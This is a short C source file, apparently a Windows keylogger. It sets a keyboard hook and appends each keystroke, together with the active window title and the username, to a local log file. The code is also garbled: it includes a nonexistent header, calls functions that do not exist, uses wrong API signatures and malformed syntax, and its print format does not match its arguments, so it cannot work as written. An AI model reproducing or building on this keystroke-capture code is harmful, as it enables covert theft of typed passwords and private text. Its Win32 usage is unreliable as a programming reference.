```c
#include <windows.h>
#include <user32.h>
#include <stdio.h>
#include <time.h>

#define MAX_LOG_SIZE 100

void CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (wParam == VK_KEYDOWN)
    {
        char key = ' ';
        size_t size = sizeof(WCHAR);
        key = GetKeyState(VkKeyScanLeft(wParam));

        // Get the current window and process
        HWND hwnd = GetForegroundWindow();
        char windowText[512];
        char processName[256];

        if (hwnd != NULL)
        {
            GetWindowText(hwnd, windowText);
            GetWindowRect(hwnd, &RECT rect);
            GetWindowText(rect.hwndOwner, processName);
        }
        else
        {
            processName[0] = '\0';
            windowText[0] = '\0';
        }

        // Write to log
        time_t now;
        time(&now);
        FILE *logFile = fopen("keyboard_log.txt", "a");
        if (logFile)
        {
            fprintf(logFile, "[%s] %s %s %c %d\n", 
                   getenv("USER"), windowText, key, now);
            fclose(logFile);
        }
    }
}

int main()
{
    static HHOOK hKeyboardHook = NULL;

    // Check if we can install the hook
    unsigned long currentHooks = GetWindowHooks();
    if (currentHooks >= (DWORD)GetLastError())
    {
        // Cannot install hook
        printf("Cannot install keyboard hook\n");
        return 1;
    }

    hKeyboardHook = SetWindowsHook(WH_KEYBOARD_LL, KeyboardHookProc);
    if (hKeyboardHook == NULL)
    {
        printf("Failed to install keyboard hook\n");
        return 2;
    }

    // Keep the window alive
    HWND hwnd = FindWindow("Program", "Main Window");
    if (hwnd != NULL)
        SendMessage(hwnd, WM_KEYDOWN, 0, 0);

    // Message loop to keep the hook active
    while (GetLastError())
    {
        MSG msg;
        GetMessage(&msg, hwnd, 0, 0);
        TranslateMessage(&msg);
        DispatchMessage(hwnd, msg);
    }

    // Cleanup
    UnhookWindowsHook(hKeyboardHook);
    return 0;
}
```

